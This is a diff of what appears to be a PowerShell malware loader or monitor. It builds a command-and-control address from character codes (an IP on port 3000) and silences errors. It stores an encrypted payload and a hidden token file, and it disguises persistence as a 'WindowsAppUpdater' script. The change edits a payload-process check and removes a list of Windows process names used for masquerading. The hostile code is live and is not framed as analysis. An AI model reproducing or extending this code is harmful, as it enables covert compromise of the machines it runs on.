@@ -1,3 +1,4 @@
+
 $ErrorActionPreference = 'SilentlyContinue'
 
 $sUrl = 'http://' + [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+[char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':3000'
@@ -8,17 +9,6 @@ $rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
 $pFile = "$pDir\payload.enc"
 $kFile = "$kDir\.token"
 $rFile = "$rDir\updater.ps1"
-
-
-$fakeNames = @(
-    'SecurityHealthService',
-    'WmiPrvSE',
-    'SearchProtocolHost',
-    'RuntimeBroker',
-    'dllhost',
-    'conhost',
-    'sihost'
-)
 
 $aName = "WindowsAppUpdater"
 
@@ -65,22 +55,21 @@ function tFile {
     }
 }
 
-
+# Ищем процесс pythonw
 function tProc {
-    $exeProc = Get-Process RuntimeBroker -ErrorAction SilentlyContinue
+    $exeProc = Get-Process pythonw -ErrorAction SilentlyContinue
     if ($exeProc) {
         $pi = @()
         foreach ($p in $exeProc) {
-            $pi += @{ pid = $p.Id; name = "RuntimeBroker.exe" }
+            $pi += @{ pid = $p.Id; name = "pythonw.exe" }
         }
         lInfo "Process running" @{ count = ($exeProc | Measure-Object).Count; processes = $pi }
         return $true
     }
     
-    lErr "Payload process not found"
+    lErr "Payload process (pythonw) not found"
     return $false
 }
-
 
 function tRun {
     param([string]$n)
